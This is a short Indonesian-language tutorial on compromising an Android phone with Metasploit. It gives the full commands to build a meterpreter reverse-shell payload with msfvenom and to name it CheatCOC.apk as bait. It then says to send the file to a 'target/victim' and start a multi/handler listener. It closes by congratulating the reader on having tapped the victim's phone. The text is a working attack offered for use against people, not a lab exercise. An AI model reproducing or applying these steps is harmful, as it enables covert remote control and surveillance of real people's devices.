# Metasploit

# Android Attack 

$sudo apt update

$sudo apt upgrade

$ifconfig (untuk mengetahui ip)

$sudo su (masuk ke menu root)

Membuat payload dengan perintah

 #msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.111.61(ip yang di cek tadi) LPORT=4321 R> CheatCOC.apk

tunggu dan jika sudah selesai cek aplikasi yang sudah di buat tadi di folder /home/kali

kemudian kirim aplikasi ke target/korban

buat exploit handler dengan perintah

#etc/init.d/postgresql start

#msfconsole

#use multi/handler

#set payload android/meterpreter/reverse_tcp

#set LHOST 192.168.111.61

#set LPORT 4321

#exploit

kemudian tunggu target/korban membuka aplikasi yang sudah di kirim tadi

>? (untuk melihat apa saja perintah yang dapat dilakukan)

# selamat kamu telah menyadap hp target/korban mu :)
